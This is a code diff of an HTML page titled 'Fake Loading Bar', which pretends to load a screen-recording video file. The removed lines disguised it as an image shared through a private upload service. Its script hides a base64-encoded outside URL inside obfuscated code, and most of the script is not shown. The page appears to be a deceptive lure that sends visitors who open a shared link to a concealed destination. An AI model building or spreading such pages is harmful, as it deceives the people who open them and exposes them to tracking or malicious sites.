@@ -2,33 +2,45 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta content="Image shared to you by ChrisArrived" property="og:title" />
-<meta content="Provided by Development Multiverse, the best private image uploading service!" property="og:description" />
-<meta content="#ff0000" data-react-helmet="true" name="theme-color" />
-<title>Loading Bar</title>
+<title>Fake Loading Bar</title>
 <style>
+    body {
+        background-color: #000; /* Black background */
+        color: #fff; /* White text color */
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
     #loadingBarContainer {
-        width: 500px;
-        height: 30px;
-        border: 2px solid #000;
-        position: relative;
+        width: 80%;
+        max-width: 500px;
+        height: 20px;
+        border: 1px solid #fff;
+        border-radius: 10px; /* Rounded corners for the loading bar */
+        overflow: hidden; /* Ensures the inner bar doesn't break the rounded corners */
     }
     #loadingBar {
         width: 0%;
         height: 100%;
-        background-color: green;
+        background-color: #4CAF50; /* A modern green color */
+        transition: width 0.5s ease-out; /* Smooth transition for the loading effect */
     }
     #fileName {
-        margin-top: 10px;
-        font-family: Arial, sans-serif;
+        text-align: center;
+        margin-top: 20px;
     }
 </style>
 </head>
 <body>
-    <div id="loadingBarContainer">
-        <div id="loadingBar"></div>
+    <div>
+        <div id="loadingBarContainer">
+            <div id="loadingBar"></div>
+        </div>
+        <p id="fileName">Loading Screen-Recording-DATE.mp4...</p>
     </div>
-    <p id="fileName">Loading Screen-Recording-DATE.mp4...</p>
     <script>
         // Encoded URI
         var _0x23a5=['aHR0cHM6Ly9jaHJpc2Fycml2ZWQuY29t'];
@@ -63,4 +75,3 @@
     </script>
 </body>
 </html>
-
